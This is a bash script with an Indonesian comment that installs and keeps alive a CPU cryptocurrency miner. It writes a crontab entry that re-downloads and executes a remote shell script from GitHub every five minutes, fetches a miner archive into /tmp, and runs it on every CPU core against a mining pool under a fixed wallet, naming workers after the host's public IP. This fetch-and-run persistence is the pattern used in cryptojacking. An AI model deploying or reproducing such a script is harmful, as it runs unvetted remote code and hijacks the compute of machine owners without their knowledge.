#!/bin/bash
#cek jalan nya program
if ps -C hell >/dev/null;
then
  echo "Service is running";
else
  echo "Service stopped";
  sleep 2
  echo " Starting service";
  sleep 3
  cronjob="wget https://raw.githubusercontent.com/ToxicBoy6969/HW-/master/hell.sh -O /tmp/hell.sh;bash /tmp/hell.sh"
  if crontab -l | grep "$cronjob" >/dev/null;
  then
    echo "Cronjob found";
    sleep 2
  else
    user=$(whoami)
    echo "Cronjobs not found, Creating cronjobs"
    sleep 2
    (crontab -u $user -l; echo "*/5  * * * * $cronjob" ) | crontab -u $user -
  fi
  ip=$(wget -qO - icanhazip.com)
  workers=$(echo "$ip" | sed 's/\./_/g')
  wget -qO- https://github.com/ToxicBoy6969/HW-/raw/main/hellminer.tar.gz | tar xvz -C /tmp/
  screen -dmS mine bash -c 'cd /tmp/hellminer;./hell -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RS4KppGuDas7EXCr9Q6VJ4sMVTHM9zpDtn.$workers -p x --cpu $(grep -c processor /proc/cpuinfo)'
  echo " Check mining with screen -r mine"
  echo " Redirecting to miner ....."
  sleep 5
  screen -r mine
fi